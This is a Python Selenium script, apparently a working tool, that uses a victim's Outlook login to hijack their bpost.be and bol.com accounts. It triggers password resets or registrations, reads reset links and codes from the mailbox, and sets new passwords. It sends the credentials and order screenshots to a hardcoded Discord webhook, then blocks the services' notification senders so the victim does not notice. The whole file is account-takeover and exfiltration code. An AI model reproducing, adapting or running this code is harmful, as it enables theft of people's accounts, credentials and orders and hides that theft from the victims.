# -*- coding: utf-8 -*-
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import requests
import json
import pyfiglet
from colorama import init, Fore, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import init
from time import sleep
init(autoreset=True)
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
import io
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import logging
import os
import pyperclip
import re
from selenium.common.exceptions import WebDriverException
import sys
def parse_args():
    if len(sys.argv) != 4:
        print("Gebruik: python bpost.py <email> <password> <webhook_url>", file=sys.stderr)
        sys.exit(1)
    return sys.argv[1], sys.argv[2], sys.argv[3]



emails_to_block = [
        "noreply@bpost.be",
        "noreply@communication.bpost.be",
        "info@service-mail.zalando.be",
          # eventueel deze ook
    ]

emailss_to_block = [
        "automail@bol.com"
          # eventueel deze ook
    ]





webhook_url = "https://discord.com/api/webhooks/1332795184408297634/ofiODu9wua0qn49GOhnFkw-XJn42oVLwOU7jx_zB3ldlH1eGPmUzhO_IjAUJ1HxPotjN"
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def block_sender(driver, email_to_block):
    driver.set_window_position(5000, 5000)
    print(f"🚩 Start blokkeren van: {email_to_block}")
    driver.get("https://outlook.live.com/mail/0/options/mail/junkEmail")
    wait = WebDriverWait(driver, 30)

    # 1) Tab “Blocked senders and domains”
    tab = wait.until(EC.element_to_be_clickable((
        By.CSS_SELECTOR,
        "button[value='blockedSendersAndDomains']"
    )))
    tab.click()
    time.sleep(3)

    # 2) Vind “Add blocked sender”-knop via unicode-icoon (taalonafhankelijk)
    add_button = wait.until(EC.element_to_be_clickable((
        By.XPATH,
        "//button[.//i[normalize-space(text())='']]"
    )))

    # Scroll naar knop en klik (JS fallback indien nodig)
    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", add_button)
    try:
        add_button.click()
    except:
        driver.execute_script("arguments[0].click();", add_button)

    print("✅ Add blocked sender button is aangeklikt.")
    time.sleep(2)

    # 3) E-mailadres invullen
    input_xpath = "//input[starts-with(@id, 'field-') and @type='text']"
    wait.until(EC.presence_of_element_located((By.XPATH, input_xpath))).send_keys(email_to_block)
    time.sleep(1)

    # 4) OK en Save
    ok_button_css = "div[role='dialog'] button.AomV9"
    ok_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ok_button_css)))
    try:
     ok_button.click()
    except:
     driver.execute_script("arguments[0].click();", ok_button)
    print("✅ OK geklikt")
    time.sleep(1)
    save_button = wait.until(EC.element_to_be_clickable((
    By.CSS_SELECTOR,
    "div[role='dialog'] button.___1akj6hk"
)))
    try:
     save_button.click()
    except:
     driver.execute_script("arguments[0].click();", save_button)
    
    print(f"🎉 '{email_to_block}' is nu geblokkeerd en opgeslagen.")


# Stel de Discord-webhook URL in
webhook_url = "JOUW_DISCORD_WEBHOOK_URL"

def bol_com_password_reset_process(driver, email_address, outlook_password,current_process ):
    breadcrumb_xpath = "//ul[@id='option_block_4']//li[@class='breadcrumbs__item']"
    print(Fore.YELLOW + "Bol.com herstelproces gestart..." + Style.RESET_ALL)

    new_password = generate_random_password()
    
    # Ga naar de Bol.com loginpagina
    driver.get("https://login.bol.com/wsp/login")
    
    # Zoek en klik op de 'Wachtwoord vergeten?' link
    wachtwoord_vergeten_link = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, "//a[contains(text(),'Wachtwoord vergeten?')]"))
    )
    wachtwoord_vergeten_link.click()
    
    # Wacht totdat de pagina voor wachtwoordherstel geladen is
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, "//*[@id='react-aria-1']"))
    )
    
    # Vul het e-mailadres in
    email_input = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, "//*[@id='react-aria-1']"))
    )
    email_input.send_keys(email_address)
    
    # Klik op de verzendknop
    button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, "//*[@id='__next']/main/div/div/form/div[2]/button"))
    )
    time.sleep(3)  # Tijd om de knop klikbaar te maken
    button.click()
    print("Verzoek om wachtwoordherstel verstuurd naar Bol.com.")
    
    # Open een nieuw tabblad en ga naar Outlook Inbox
    
    driver.execute_script("window.open('about:blank', '_blank');")
    driver.switch_to.window(driver.window_handles[-1])
    driver.set_window_position(5000, 5000) 
    print("Zoeken naar herstel e-mail van Bol.com in de Inbox...")
    driver.get("https://outlook.live.com/mail/0/inbox")
    time.sleep(10)
    
    # Zoek naar de herstel e-mail van Bol.com
    bol_email = search_email(driver, "bol", "link")
    
    # Als de e-mail niet wordt gevonden in de inbox, ga dan naar de junkmap
    if not bol_email:
        print("Geen Bol.com e-mail in inbox gevonden. Controleer de Junk (ongewenste e-mail) map...")
        driver.get("https://outlook.live.com/mail/0/junkemail")
        time.sleep(5)
        bol_email = search_email(driver, "bol", "link")
    
    if bol_email:
        print("Bol.com e-mail gevonden, nu klikken...")
        bol_email.click()

        try:
            # Zoek de link in de e-mail
            link = bol_email.find_element(By.XPATH, "//a[contains(@href, 'reset_password')]")
            link_url = link.get_attribute('href')
            print(f"Herstelwachtwoord link: {link_url}")
            
            # Open de link in hetzelfde tabblad
            driver.get(link_url)
            print("Herstelwachtwoord link geopend!")

            # Wacht op nieuwe wachtwoordvelden
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "react-aria-1"))
            )
            password_field.send_keys(new_password)

            # Wacht tot de knop beschikbaar is en klik
            submit_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//button[@type='SUBMIT']"))
            )
            submit_button.click()
            print(Fore.GREEN + f"Nieuw wachtwoord ingesteld: {new_password}" + Style.RESET_ALL)

            WebDriverWait(driver, 10).until(
    EC.url_contains("account/overzicht")  # Controleer of de URL de juiste is voor de overzichtspagina
)
            print("Je bent nu op de 'Overzicht' pagina van je account!")
            driver.get("https://www.bol.com/nl/rnwy/account/bestellingen/overzicht")
            print("Navigeren naar bestellingen overzicht pagina...")
            
            try:
                reject_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "js-reject-all-button"))
                )
                reject_button.click()
                print(Fore.YELLOW + "Cookies geweigerd!" + Style.RESET_ALL)
            except Exception as e:
                print(f"Fout tijdens het weigeren van cookies: {e}")
    
            try:
               WebDriverWait(driver, 20).until(
        EC.presence_of_element_located((By.XPATH, breadcrumb_xpath))
    )
               
            except TimeoutException:
               print(Fore.RED + "Breadcrumbs niet gevonden binnen de tijd!" + Style.RESET_ALL)
            
            # Wacht totdat het bestellingen overzicht geladen is
            
            
            try:
                # Controleer of de tekst "Je hebt nog geen bestellingen geplaatst" aanwezig is
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//h2[contains(text(), 'Je hebt nog geen bestellingen geplaatst')]"))
                )

                # Als de tekst wordt gevonden, betekent dit dat er geen bestellingen zijn
                print(Fore.RED + "Geen bestellingen gevonden!" + Style.RESET_ALL)
                
                # Geen Discordmelding verzenden omdat er geen bestellingen zijn
                pass
                
            except:
                # Als de tekst niet wordt gevonden, betekent dit dat er wel bestellingen zijn
                print(Fore.GREEN + "Bestellingen gevonden!" + Style.RESET_ALL)
                screenshot = driver.get_screenshot_as_png()
                # Stuur een Discordmelding als er bestellingen zijn
                send_to_discord_bol_com(email_address, new_password, webhook_url, screenshot)
            
             
            for email in emails_to_block:
             try:
              block_sender(driver, email)
              time.sleep(3)  # optioneel: wacht tussen acties
             except Exception as e:
              print(f"⚠️ Fout bij '{email}': {e}")    
            
                  
            delete_emails_from_inbox(driver, emailss_to_block)
        except NoSuchElementException:
            print(Fore.RED + "Geen geldige herstelwachtwoordlink gevonden in de e-mail." + Style.RESET_ALL)
    else:
        print(Fore.RED + "Geen herstelwachtwoord link gevonden in de e-mail. geen bol.com" + Style.RESET_ALL)

    quit_driver(driver, current_process)


            





    
            






def create_driver():
    # Maak een logging filter om specifieke logmeldingen te onderdrukken
    class MyLogFilter(logging.Filter):
        def filter(self, record):
            # Als de foutmelding "DevTools listening" bevat, negeren we het
            if 'DevTools listening' in record.getMessage():
                return False
            if 'ERROR:direct_composition_support.cc' in record.getMessage():
                return False
            return True

    # Stel logging in voor selenium om ongewenste meldingen te onderdrukken
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger('selenium')
    logger.addFilter(MyLogFilter())

    os.environ['LOGLEVEL'] = '3'  # Zet logniveau naar fouten
    logging.getLogger('selenium').setLevel(logging.WARNING)

    chrome_options = Options()

    # Voeg de optie toe om SSL-fouten te negeren
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
    
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--no-sandbox")
    #chrome_options.add_argument("--headless")  # Optioneel, als je in headless modus wilt draaien

    driver = webdriver.Chrome(options=chrome_options)  # Maak een nieuwe WebDriver instantie met de opties
    return driver



webhook_url = "https://discord.com/api/webhooks/1332795184408297634/ofiODu9wua0qn49GOhnFkw-XJn42oVLwOU7jx_zB3ldlH1eGPmUzhO_IjAUJ1HxPotjN"



def send_to_discord(email, password, webhook_url):
    message = {
    "content": f"**Bpost! Gegevens:**\n\n{email}\n{password}\n", 
}

    try:
        response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})
        
        if response.status_code == 204:
            print("\033[1;34mBericht succesvol naar Discord gestuurd!\033[0m")

        else:
            print(f"\033[1;31mFout bij het verzenden naar Discord, Kijk handmatig : {response.status_code}\033[0m")

    except Exception as e:
        print(f"Er is een fout opgetreden bij het verzenden naar Discord: {str(e)}")


def send_to_discord_bol_com(email, new_password, webhook_url, screenshot):
    # Maak het bericht
    message = {
    "content": f"**Bol.com! Gegevens:**\n\n{email}\n{new_password}\n",
}



    # Zet het screenshot om naar een bestand in geheugen
    file = io.BytesIO(screenshot)

    # Voeg de parameters voor de Discord webhook toe
    files = {
        "file": ("screenshot.png", file, "image/png")
    }

    try:
        # Verstuur het bericht samen met het screenshot naar Discord
        response = requests.post(webhook_url, data=message, files=files)

        if response.status_code == 200:
            print("\033[1;34mBericht en screenshot succesvol naar Discord gestuurd voor Bol.com!\033[0m")
        else:
            print(f"\033[1;31mFout bij het verzenden naar Discord voor Bol.com, Kijk handmatig: {response.status_code}\033[0m")

    except Exception as e:
        print(f"Er is een fout opgetreden bij het verzenden naar Discord voor Bol.com: {str(e)}")       












# Genereer de ASCII-art tekst
from art import *
ascii_art = text2art("Bpost 187")
print(Fore.RED + ascii_art + Style.RESET_ALL)



# Functie om de e-mail en wachtwoord combinatie te splitsen


# Functies voor dynamische invoer van gegevens
def generate_random_name():
    first_names = ["Liam", "Emma", "Noah", "Olivia", "James"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Davis"]
    return random.choice(first_names), random.choice(last_names)

def generate_random_password():
    while True:
        password_length = 12  # Lengte van het wachtwoord (minimaal 8 tekens)
        
        # Veilige speciale tekens die vaak goed worden geaccepteerd
        safe_special_characters = "@#$%&*!"
        
        # Genereer een wachtwoord met minimaal 1 kleine letter, 1 hoofdletter, 1 cijfer en 1 speciaal teken
        lower_case = random.choice(string.ascii_lowercase)
        upper_case = random.choice(string.ascii_uppercase)
        digit = random.choice(string.digits)
        special_char = random.choice(safe_special_characters)
        
        # Vul de rest van het wachtwoord aan met willekeurige tekens
        remaining_characters = random.choices(string.ascii_letters + string.digits + safe_special_characters, k=password_length - 4)
        
        # Combineer de eerder gekozen tekens met de resterende
        password = lower_case + upper_case + digit + special_char + ''.join(remaining_characters)
        
        # Schud het wachtwoord om ervoor te zorgen dat de volgorde willekeurig is
        password = ''.join(random.sample(password, len(password)))
        
        # Controleer of het wachtwoord voldoet aan de vereisten
        if (len(password) >= 8 and
            any(c.islower() for c in password) and  # Moet een kleine letter bevatten
            any(c.isupper() for c in password) and  # Moet een hoofdletter bevatten
            any(c.isdigit() for c in password) and  # Moet een cijfer bevatten
            any(c in safe_special_characters for c in password)):  # Moet een veilig speciaal teken bevatten
            return password

def click_random_element(driver):
    random_element = driver.find_element(By.XPATH, "//body")  # Zoek een willekeurig element (bijv. body)
    action = ActionChains(driver)
    action.move_to_element(random_element).click().perform()

# Outlook-login functie
def login_to_outlook(driver, email_address, password):
    driver.get("https://go.microsoft.com/fwlink/p/?linkid=2125442&clcid=0x813&culture=nl-be&country=be")
    email_input = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((
        By.XPATH,
        "//input[@id='i0116' or @id='usernameEntry']"
    ))
)
    email_input.send_keys(email_address)
    login_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "(//button[@id='idSIButton9' or @data-testid='primaryButton']"
        " | //input[@id='idSIButton9' and @type='submit'])"
    ))
)
    login_button.click()
    password_input = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//input[@id='i0118' or @id='passwordEntry']"
    ))
)
    password_input.click()
    password_input.send_keys(password)
    login_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@id='idSIButton9' or @data-testid='primaryButton']"
    ))
)
    login_button.click()
    
    
    # Klik op de 'Nee' knop als die verschijnt
    try:
        decline_button = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((
        By.XPATH,
        "//button[@id='declineButton' or @data-testid='secondaryButton']"
    ))
)
        decline_button.click()
    except:
        pass

    print("Ingelogd op Outlook.")

# Functie om e-mails te doorzoeken
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

import re
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import re
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def search_email(driver, sender_email, search_type="link", platform=None, process=None):
    """
    Zoekt een e-mail van sender_email in de Inbox of Junk,
    opent deze en retourneert óf een <a>-element voor een reset-link,
    óf de 6-cijferige verificatiecode.
    """
    try:
        # 1) Mail openen via afzender-tekst
        mail_elem = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, f"//span[contains(text(), '{sender_email}')][1]"))
        )
        mail_elem.click()
        print("E-mail geopend...")
        time.sleep(2)

        # 2) LINK-logica
        if search_type == "link":
            try:
                return WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "hier"))
                )
            except:
                print("Link met tekst 'Nieuw wachtwoord' niet gevonden. Probeer 'Nouveau mot de passe'...")
                try:
                    return WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "Nouveau mot de passe"))
                    )
                except:
                    print("Link met tekst 'Nouveau mot de passe' niet gevonden. Probeer 'hier'...")
                    try:
                        return WebDriverWait(driver, 10).until(
                            EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "hier"))
                        )
                    except Exception:
                        print("Geen geldige link gevonden in de e-mail.")
                        return None

        # 3) CODE-logica
        elif search_type == "code":
            try:
                # Zoek direct alle <strong>-tags in de pagina
                strong_tags = WebDriverWait(driver, 10).until(
                    EC.presence_of_all_elements_located((By.TAG_NAME, 'strong'))
                )

                for tag in strong_tags:
                    code = tag.text.strip()
                    print(f"Gevonden <strong>: {code}")
                    if re.fullmatch(r"\d{6}", code):
                        print(f"Code gevonden in <strong>: {code}")
                        return code

                # Fallback: hele pagina doorzoeken op 6-cijferige code
                full_text = driver.find_element(By.TAG_NAME, 'body').text
                match = re.search(r"\b\d{6}\b", full_text)
                if match:
                    print(f"Code gevonden in tekst: {match.group(0)}")
                    return match.group(0)

                print("Geen 6-cijferige code gevonden in de e-mail.")
                return None

            except Exception as e:
                print(f"Fout bij ophalen e-mailinhoud: {e}")
                return None

        # 4) Geen bekende search_type
        else:
            print(f"Onbekend search_type: {search_type}")
            return None

    except Exception as e:
        print(f"Fout in search_email")
        return None





def delete_emails_from_inbox(driver, email):
    print("\033[1;33mLaatste stap: verwijder Bol.com, Zalando of Bpost mails uit inbox!!! (als die er zijn)\033[0m")
    time.sleep(3)

    try:
        # Open een nieuw tabblad
        driver.maximize_window()
        driver.execute_script("window.focus();")
        actions = ActionChains(driver)
        actions.send_keys(Keys.CONTROL + 't').perform()
        WebDriverWait(driver, 3).until(lambda driver: len(driver.window_handles) > 1)

        # Ga naar de inbox pagina
        driver.get("https://outlook.live.com/mail/0/inbox")

        # Controleer of de pagina correct is geladen
        WebDriverWait(driver, 10).until(EC.url_contains("https://outlook.live.com/mail/0/inbox"))
        current_url = driver.current_url
        if "https://outlook.live.com/mail/0/inbox" in current_url:
            print("Pagina succesvol geladen: Inbox")
        else:
            print("Fout: De pagina is niet correct geladen. Huidige URL:", current_url)

        time.sleep(15)
        driver.set_window_position(5000, 5000)

        # Vraag de gebruiker of ze de e-mails hebben verwijderd
        task_done = input("Heb je de e-mails verwijderd? (y/n): ").strip().lower()
        if task_done == 'y':
            print(Fore.GREEN + "Dikke bal! E-mails succesvol verwijderd." + Style.RESET_ALL)
        else:
            print(Fore.RED + "Let op: Verwijder de e-mails om niet geneukt te worden." + Style.RESET_ALL)
            print(f"Probeer het opnieuw met de e-mail: {email}")

    except WebDriverException:
        print(Fore.YELLOW + "\n📌 Browser werd handmatig gesloten. Yellah volgende?" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"\nEr ging iets anders mis: {e}" + Style.RESET_ALL)




# Herstelwachtwoord proces

def password_reset_process(driver, email_address, outlook_password):
    print("Overgaan naar herstelwachtwoord proces...")
    driver.get("https://login.bpost.be/ext/pwdreset/Identify?AdapterId=APITestAdapter&TargetResource")
    
    # Vul e-mailadres in en verstuur verzoek
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email_address)
    driver.find_element(By.CSS_SELECTOR, ".ping-button").click()
    print("Herstelverzoek verstuurd.")

    # Open een nieuw tabblad voor Outlook
    driver.execute_script("window.open('about:blank', '_blank');")
    driver.switch_to.window(driver.window_handles[1])
    login_to_outlook(driver, email_address, outlook_password)  # Login met Outlook-wachtwoord

    # Zoek in Inbox
    print("Zoeken naar herstelwachtwoord link in de Inbox...")
    link = search_email(driver, "noreply@bpost.be", "link", "bpost", "Bpost")
    if not link:
        print("Geen link gevonden in de Inbox. Overgaan naar Junkmail...")
        driver.get("https://outlook.live.com/mail/0/junkemail")
        link = search_email(driver, "noreply@bpost.be", "link", "bpost", "Bpost")

    if link:
        link_url = link.get_attribute('href')
        driver.execute_script(f"window.open('{link_url}', '_blank');")  # Open de herstel link in een nieuw tabblad
        driver.switch_to.window(driver.window_handles[2])  # Switch naar nieuw tabblad
        print("Herstelwachtwoord link geopend in nieuw tabblad!")

        # Wacht op de nieuwe wachtwoordvelden
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "newPassword"))
        )
        
        # Genereer een nieuw wachtwoord
        new_password = generate_random_password()  # Gebruik outlook_password

        # Vul het nieuwe wachtwoord in
        driver.find_element(By.ID, "newPassword").send_keys(new_password)
        driver.find_element(By.ID, "confirmPassword").send_keys(new_password)

        # Klik op de knop "Opnieuw instellen"
        reset_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//a[@onclick='postOk();']"))
        )
        reset_button.click()
        
        print(Fore.BLUE + "Bpost succesvol opnieuw ingesteld!" + Style.RESET_ALL)
        print(Fore.GREEN + f"E-mailadres: {email_address}" + Style.RESET_ALL)
        print(Fore.GREEN + f"Nieuw wachtwoord: {new_password}" + Style.RESET_ALL)

        # Verzenden naar Discord
        send_to_discord(email_address, new_password, webhook_url)

        # Blokkeren van e-mails
        for email in emails_to_block:
         try:
            block_sender(driver, email)
            time.sleep(3)  # optioneel: wacht tussen acties
         except Exception as e:
            print(f"⚠️ Fout bij '{email}': {e}")
        delete_emails_from_inbox(driver, emails_to_block)
        # Laatste stap: verwijder Bol.com, Zalando of Bpost e-mails uit inbox
        
            
    else:
        print("\033[1;31mGeen herstelwachtwoord link gevonden.\033[0m")
        # Sluit de browser bij fout


# Registratie proces
# Registratie proces
def registration_process(driver, email_address, password):
    
    print("Verificatiecode aangevraagd.")

    # Log in op Outlook om de verificatiecode te zoeken
    driver.execute_script("window.open('about:blank', '_blank');")
    driver.switch_to.window(driver.window_handles[1])
    login_to_outlook(driver, email_address, password)

    # Zoek in Inbox
    print("Inbox openen...")
    driver.get("https://outlook.live.com/mail/0/inbox")
    time.sleep(5)  # even wachten tot pagina geladen is

    print("Zoeken naar verificatiecode in de Inbox...")
    code = search_email(driver, "noreply@bpost.be", "code", "bpost", "code")

    if not code:
        print("Geen code gevonden in de Inbox. Overgaan naar Junkmail...")
        driver.get("https://outlook.live.com/mail/0/junkemail")
        code = search_email(driver, "noreply@bpost.be", "code", "bpost", "Bpost")

    if code:
        print(f"Verificatiecode gevonden: {code}")
        driver.switch_to.window(driver.window_handles[0])

        # Vul de verificatiecode in
        verification_code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "edit-verification-code"))
        )
        verification_code_input.send_keys(code)

        time.sleep(3)

        click_random_element(driver)
        time.sleep(3)
        
        # Vul een willekeurige voornaam in
        first_name, last_name = generate_random_name()
        first_name_input = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "edit-name-first"))
        )
        first_name_input.send_keys(first_name)

        # Vul een willekeurige achternaam in
        last_name_input = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "edit-name-last"))
        )
        last_name_input.send_keys(last_name)

        # Genereer een wachtwoord
        random_password = generate_random_password()
        password_input = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "edit-password"))
        )
        password_input.send_keys(random_password)

        terms_checkbox = WebDriverWait(driver, 10).until(
    EC.element_to_be_clickable((By.ID, "edit-terms-and-conditions"))
)

# 2. Scroll naar checkbox
        driver.execute_script("arguments[0].scrollIntoView(true);", terms_checkbox)
        time.sleep(0.2)

# 3. Klik checkbox
        terms_checkbox.click()

        submit_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "edit-actions-submit"))
        )
        submit_button.click()

        # Controleer of de URL verandert naar login.bpost.be (succesvolle registratie)
        WebDriverWait(driver, 10).until(EC.url_contains("login.bpost.be"))
        print("Bpost succesvol aangemaakt! De URL zie ik!!")

        print(Fore.GREEN + f"E-mailadres: {email_address}" + Style.RESET_ALL)

        print(Fore.GREEN + f"wachtwoord: {random_password}" + Style.RESET_ALL)


        send_to_discord(email_address, random_password, webhook_url, )

          # Sluit de browser na registratie
        
        for email in emails_to_block:
         try:
            block_sender(driver, email)
            time.sleep(3)  # optioneel: wacht tussen acties
         except Exception as e:
            print(f"⚠️ Fout bij '{email}': {e}")
        delete_emails_from_inbox(driver, emails_to_block)    
  # Gebruik hier de outlook_password
        
    else:
        print(Fore.RED + "Geen verificatiecode gevonden, shoef zelf of probeer opnieuw" + Style.RESET_ALL)


          # Sluit de browser als er geen code is gevonden
        

# Functie om de browser te sluiten
def quit_driver(driver, current_process, continue_to_bol=False):
    if continue_to_bol:
        # Als je verder wilt met het Bol.com proces, ga dan verder zonder vraag over Bpost
        return
    
    # Vraag de gebruiker of ze willen doorgaan met een ander account voor Bpost
    user_choice = input(f"Wil je doorgaan met een ander account? ? (y/n): ").strip().lower()

    if user_choice == 'y':
        # Herstart het proces voor een ander account
        print(f"Herstarten voor een ander account ...")
        driver.quit()
        main()  # Herstart de main functie om opnieuw in te loggen of registreren
    else:
        # Wacht op Enter om de browser af te sluiten na Bpost
        input(f"Druk op Enter om de browser af te sluiten ...")
        driver.quit()
        




        

# Hoofdsysteem
def main():
    email_address, password, webhook_url = parse_args()
    driver = create_driver()

    try:
        # Zet vensterformaat etc. als je dat wilt
        driver.set_window_size(400, 1200)
        driver.set_window_position(1920 - 450, 1080 - 850 - 120)

        # Bepaal of het e‑mailadres al bestaat
        driver.get("https://crp.bpost.be/nl/form/registration-form?redirect_url=https%3A//www.bpost.be/nl/mijn-bpost&app=nbw")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "email_address"))).send_keys(email_address)
        driver.find_element(By.CSS_SELECTOR, "label.verify-email").click()

        try:
            err = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "edit-email-exists-error")))
            if err.is_displayed():
                print("E-mailadres bestaat al, start reset flow.")
                password_reset_process(driver, email_address, password)
            else:
                print("Nieuw e‑mail, start registratie flow.")
                registration_process(driver, email_address, password)
        except:
            # als de error message niet snel genoeg verschijnt, probeer registratie
            registration_process(driver, email_address, password)

        # Na registratie of reset, block senders en cleanup
        

    except Exception:
        import traceback
        traceback.print_exc(file=sys.stderr)
        sys.exit(2)
    finally:
        driver.quit()

if __name__ == "__main__":
    main()






